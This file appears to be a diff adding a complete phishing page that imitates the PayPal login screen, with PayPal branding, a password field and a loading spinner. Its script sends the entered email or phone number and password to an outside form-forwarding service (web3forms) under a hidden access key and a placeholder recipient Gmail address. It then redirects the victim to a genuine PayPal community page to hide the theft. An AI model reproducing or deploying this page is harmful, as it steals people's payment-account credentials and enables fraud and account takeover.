@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 20px;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 60px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 5px;
+            height: 40px;
+            font-size: 17px;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #0070ba;
+            outline: none;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 10px;
+            background-color: #2f39bbf4;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            height: 45px;
+            font-weight: 900;
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 10px;
+            background-color: white;
+            color: #000;
+            border: 1px solid #0070ba;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            height: 45px;
+            font-weight: 900;
+        }
+        .forgot-password {
+            color: #0070ba;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-weight: 900;
+            font-size: 18px;
+            position: relative;
+            left: -130px;
+        }
+        .footer {
+            font-size: 12px;
+            color: #777;
+            margin-top: 50px;
+            
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            position:relative;
+            bottom:-110px;
+            
+            
+        }
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .language-selector {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .language-selector a {
+            margin: 0 5px;
+            color: #0070ba;
+            text-decoration: none;
+        }
+        .language-selector img {
+            width: 20px;
+            margin-right: 5px;
+        }
+        #show {
+            display: inline-block;
+            font-size: 17px;
+            font-weight: 500;
+            position: absolute;
+            top: 20px;
+            right: 10px;
+            cursor: pointer;
+            color: #0070ba;
+        }
+        
+        .loader-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
+            z-index: 1000;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #0070ba;  /* PayPal blue */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Hide the loader after 1 second */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <form class="form">
+        <img src="https://1000logos.net/wp-content/uploads/2017/05/emblem-Paypal-500x500.jpg" alt="PayPal Logo" class="logo">
+        
+        
+        <input type="hidden" name="access_key" value="5951613f-cd5b-4ad1-9ffc-0d8b3c929004" />
+        
+        <!-- Honeypot Field for Spam Protection -->
+        <input type="hidden" name="honeypot" value="" />
+
+        <!-- Your Gmail address -->
+        <input type="hidden" name="email" value="your-email@gmail.com" />
+        
+        <div class="input-group">
+            <input type="text" name="identification" placeholder="Email or mobile number" required>
+        </div>
+        <div class="input-group">
+            <input type="password"  name="key" id="pass" placeholder="Password" required>
+            <span id="show" onclick="sah()">Show</span>
+        </div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <button type="submit" class="btn-primary">Next</button>
+        <div style="margin: 15px; font-size: 16px;">or</div>
+        <button class="btn-secondary">Sign Up</button>
+        <div class="language-selector">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="US Flag">
+            <a href="#">English</a>
+            <a href="#">Français</a>
+            <a href="#">Español</a>
+            <a href="#">中文</a>
+        </div>
+        <div class="footer">
+            <a href="#">Contact Us</a> | 
+            <a href="#">Privacy</a> | 
+            <a href="#">Legal</a> | 
+            <a href="#">Policy Updates</a> | 
+            <a href="#">Worldwide</a>
+        </div>
+    </form>
+    
+    
+    <div id="loaderContainer" class="loader-container">
+        <div class="loader"></div>
+    </div>
+    
+    
+    <script>
+       // Get the form element
+        const form = document.querySelector('.form');
+
+        // Listen for the form submit event
+        form.addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Create a FormData object with the form data
+            const formData = new FormData(form);
+
+            // Send the form data to Web3Forms via fetch
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to Google or any desired website after successful submission
+                    window.location.href ='https://www.paypal-community.com/t5/PayPal-Community/ct-p/en';
+                } else {
+                    alert('Something went wrong. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Submission failed. Please try again.');
+            });
+        });
+       
+        function sah() {
+            let input = document.getElementById("pass");
+            let show = document.getElementById("show");
+
+            if (input.type === "password") {
+                input.type = "text";
+                show.innerHTML = "Hide";
+            } else {
+                input.type = "password";
+                show.innerHTML = "Show";
+            }
+        }
+        
+        
+          // Hide the loader after 1 second
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('loaderContainer').classList.add('hidden');
+            }, 1000);  // 1 second
+        };
+        
+    </script>
+</body>
+</html>
